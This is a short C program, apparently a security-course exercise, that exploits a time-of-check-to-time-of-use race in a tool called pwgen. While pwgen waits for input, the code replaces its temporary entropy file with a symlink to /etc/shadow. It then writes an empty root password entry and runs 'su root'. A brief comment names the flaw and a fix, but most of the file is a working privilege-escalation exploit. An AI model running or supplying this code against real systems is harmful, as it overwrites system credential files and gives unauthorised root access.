#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

/**
 * Class B: TOCTTOU
 * 
 *  Exploit method: 
 *  when pwgen asks for an entropy, replace entropy input file with
 *  shadow file. this will insert whatever entropy input directly into
 *  the shadow file, overriding user passwords
 *  
 *  Fixes:
 *  This method of exploit can be prevented by checking if you are writing
 *  on the right file just before accesing the file itself.
 *  
 */
int main(int argc, char const *argv[])
{
  char exploitStr[] = "\nroot::::::::";

	FILE *pwgen;
	pwgen = popen("pwgen -e","w");

  // while pwgen is waiting for input, link /tmp/pwgen_random to /etc/shadow
	remove("/tmp/pwgen_random");
	symlink("/etc/shadow","/tmp/pwgen_random");

  // override root user authentication
	fprintf(pwgen, exploitStr);
	fclose(pwgen);

	system("su root");

	return 0;
}